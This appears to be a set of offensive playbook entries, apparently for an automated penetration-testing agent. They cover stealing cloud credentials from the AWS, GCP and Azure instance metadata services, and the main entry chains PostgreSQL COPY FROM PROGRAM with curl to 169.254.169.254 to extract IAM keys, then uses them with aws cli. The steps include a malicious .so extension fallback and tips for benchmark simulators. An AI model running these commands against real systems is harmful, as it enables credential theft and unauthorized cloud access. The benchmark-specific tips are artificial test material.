title: AWS IMDSv1 Credential Theft
description: Exploit the AWS Instance Metadata Service (IMDS) to retrieve IAM credentials and tokens. IMDSv1 has no token requirement, making it trivially exploitable via SSRF or direct access.

title: GCP Metadata Service Exploitation
description: Access GCP instance metadata to retrieve service account tokens and project information. Requires specific headers for v1 endpoint.
prerequisites: Outbound HTTP access to metadata IP

title: Azure IMDS Token Extraction
description: Query Azure Instance Metadata Service for managed identity tokens. Tokens can be used to access Azure resources as the VM's identity.

title: PostgreSQL COPY FROM PROGRAM Chained with IMDS Credential Theft
description: PostgreSQL's COPY ... FROM PROGRAM clause executes arbitrary OS commands as the database system user (typically postgres). When the database runs on a cloud VM with IMDS access, this becomes a bridge to cloud credential theft. Attack: (1) Connect to PostgreSQL with superuser or pg_execute_server_program privilege: psql -h HOST -U postgres -d postgres. (2) Create a table to capture output: CREATE TABLE cmd_output (output text);. (3) Execute command via COPY: COPY cmd_output FROM PROGRAM 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/';. (4) Read the output: SELECT * FROM cmd_output; — this reveals the IAM role name. (5) Extract credentials: DROP TABLE cmd_output; CREATE TABLE cmd_output (output text); COPY cmd_output FROM PROGRAM 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME'; SELECT * FROM cmd_output; — this returns AccessKeyId, SecretAccessKey, Token. (6) Use credentials with aws_cli: export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...; aws sts get-caller-identity; aws s3 ls. (7) If the PostgreSQL user is not superuser, check for pg_read_server_files, pg_write_server_files, or pg_execute_server_program privileges that may allow the technique. (8) Alternative: if COPY FROM PROGRAM is blocked by SELinux or PostgreSQL config, try using PostgreSQL extension loading (CREATE EXTENSION) to load a malicious .so file.
techniques: Connect to PostgreSQL: psql -h HOST -p PORT -U postgres -d postgres
Check permissions: SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;
Create capture table: CREATE TABLE cmd_output (output text);
Execute via COPY: COPY cmd_output FROM PROGRAM 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/';
Extract credentials: COPY cmd_output FROM PROGRAM 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE'; SELECT * FROM cmd_output;
Use credentials: export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
indicators: PostgreSQL running on cloud VM (EC2, Azure VM, GCE)
IMDS endpoint reachable from DB host
COPY FROM PROGRAM not disabled (default enabled in PostgreSQL < 16)
prerequisites: PostgreSQL connection with superuser or COPY privilege
Database running on cloud infrastructure with IMDS
Network path from DB to IMDS (169.254.169.254)

title: Cloud Simulator Authentication — Custom HTTP Headers for Local S3/STS APIs
description: Local cloud service simulators (DARWIN benchmark, localstack) use custom HTTP headers for authentication instead of standard AWS CLI Signature V4. The IMDS-returned credentials must be passed as headers, NOT used with aws_cli. Attack: (1) Extract AccessKeyId, SecretAccessKey, and Token from IMDS. (2) For S3 simulator access: curl -H 'X-Access-Key-Id: AKIA...' -H 'X-Secret-Access-Key: ...' http://S3_ENDPOINT/. (3) For STS simulator: curl -H 'X-Access-Key-Id: ...' -H 'X-Secret-Access-Key: ...' http://STS_ENDPOINT/assume-role. (4) Check for X-Amz-* variants as fallback: X-Amz-Access-Key, X-Amz-Secret-Key. (5) The simulator may also accept credentials as query parameters: ?access_key=AKIA...&secret_key=... . (6) Do NOT attempt aws_cli with simulator credentials — simulators lack real AWS Signature V4 validation. Use curl_get or curl with custom headers.
techniques: S3 with custom headers: curl -H 'X-Access-Key-Id: AKIA...' -H 'X-Secret-Access-Key: ...' http://localhost:PORT/
Use curl_get tool with headers= parameter for authenticated S3 access
indicators: Local or simulated cloud endpoints (not real AWS)
IMDS returns credentials but aws_cli fails
Service identified as 'simulator' or 'DARWIN S3 simulator' in bootstrap
Endpoint responds to custom headers but not AWS Signature V4
prerequisites: Understanding that simulators use custom auth, not AWS Signature V4
